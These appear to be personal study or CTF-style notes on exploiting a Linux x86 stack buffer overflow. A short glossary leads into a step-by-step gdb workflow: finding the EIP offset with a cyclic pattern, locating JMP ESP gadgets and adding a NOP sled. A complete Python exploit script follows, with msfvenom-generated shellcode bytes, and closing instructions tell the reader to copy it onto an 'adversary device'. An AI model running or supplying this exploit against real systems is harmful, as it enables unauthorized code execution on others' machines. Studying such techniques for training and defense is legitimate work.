HEAP
    Memory that can be allocated and deallocated
STACK
    A contiguous section of memory used for passing argument
REGISTERS
    Storage elements as close as possible to the central processing unit (CPU)
INSTRUCTION POINTER (IP)
    a.k.a Program Counter (PC), contains the address of next instruction to be executed
STACK POINTER (SP)
    Contains the address of the next available space on the stack
BASE POINTER (BP)
    The base of the stack
FUNCTION
    Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient
SHELLCODE
    The code that is executed once an exploit successfully takes advantage of a vulnerability
    
GDB is for Linux
IMMUNITY is for windows

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------Start
There are only two ways to interact with an executable
    User Input
    Parameters



gdb <function>

pdisass main
    __x86.get_pc_thunk.bx IS NOT USEFUL! DONT ENTER
    
pdisass <func>
google to see if RED text func is vulnerable

        wiremask.eu
        put in script
--------------------------------------------------------------------
#### EXACT AMOUNT of bytes req to control the EIP ####
overflow = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"
#### Print it all out####
print(overflow) 
=-----------------------------------------------------------
run <<< $(python lin_buff.py) for user input
run $(python lin_buff.py) for parameters

        GO TO EIP
        GRAB THE HEX VALUE
        put in wiremask
        REMOVE PATTERN
        REPLACE with CAPITAL "A * <the number you got>"
-----------------------------------------------------------------------------------VVVVVVVVVVVVVVVVVVVVVVVVV
#### EXACT AMOUNT of bytes req to control the EIP ####
overflow = "A" * 62

### Test to confirm control of EIP  ###
eip = "B" * 4 
#### Print it all out####
print(overflow + eip)
---------------------------------------------------------------------------------^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
        rerun last command after editing your script (INCLUDE EIP IN PRINT)
            run <<< $(python lin_buff.py) for user input
            run $(python lin_buff.py) for parameters
        make sure you can see your 4 B's in EIP

        env - gdb <file youre exploiting>
            NO COLORS
        show env
        unset any variable in env
            unset env LINES 
            unset env COLUMNS 
        run
            SPAM A's in terminal for a while
        info proc map
            find /b <start addr after heap>,<end addr before stack>,0xff,0xe4       **********************************
        Grab about 5 random ones
        input in script
        reverse
------------------------------------------------------------------------
            #### EXACT AMOUNT of bytes req to control the EIP ####
            overflow = "A" * 62

            ### Test to confirm control of EIP  ###
            eip = "B" * 4


            #### ACTUAL EIP in Reverse endian ####
            eip = "\xef\x55\xf6\xf7"

            '''
            0xf7 f6 59 ef
            0xf7f662eb
            0xf7f6649b
            0xf7f66533
            0xf7f66633
            0xf7f66b3b
            '''

            #### NOP sled for safety####
            nop = "\x90" * 10

            #### Print it all out####
            print(overflow + eip + nop)
----------------------------------------------------------------------
            put nop sled in script
                #### NOP sled for safety####
                nop = "\x90" * 10
            quit gdb
            msfvenom -p linux/x86/exec CMD="whoami" -b "\x00" -f python
                (USED TO REGENRATE SHELL CODE)
                
                
         !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
#### EXACT AMOUNT of bytes req to control the EIP ####
overflow = "A" * 62

### Test to confirm control of EIP  ###
eip = "B" * 4


#### ACTUAL EIP in Reverse endian ####
eip = "\xef\x59\xf6\xf7"

'''
0xf7 f6 59 ef
0xf7f662eb
0xf7f6649b
0xf7f66533
0xf7f66633
0xf7f66b3b
'''

#### NOP sled for safety####
nop = "\x90" * 10


#### Finally, shellcode####
buf =  b""
buf += b"\xda\xd3\xd9\x74\x24\xf4\x5a\xb8\xcf\xa6\x91\x6b"
buf += b"\x33\xc9\xb1\x0b\x31\x42\x19\x03\x42\x19\x83\xc2"
buf += b"\x04\x2d\x53\xfb\x60\xe9\x05\xae\x10\x61\x1b\x2c"
buf += b"\x54\x96\x0b\x9d\x15\x30\xcc\x89\xf6\xa2\xa5\x27"
buf += b"\x80\xc1\x64\x50\x95\x05\x89\xa0\xed\x6d\xe6\xc1"
buf += b"\x7c\x04\xf8\x56\x2c\x5f\x19\x95\x52"


#### Print it all out####
print(overflow + eip + nop + buf)
~                                                               
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!    
            
            
  
            TEST
            ./<file> <<< $(python <script>)
ADD 5 to nop sled
Regenerate Shell code


              
               
               
               RUN THE WHOLE PROCESS ON YOUR MACHINE 
               THEN COPY PASTE ONTO ADVERSARY DEVICE
               Shouldnt have to change anything but eip
                    gdb
                    
               RUN
               
               
               
           DONT INSTALL ANYTHING
           IF GDB IS ON THE BOX YOU WILL DO BUFFER OVERFLOW
           which gdb





Windows buff overflow should already be on your device
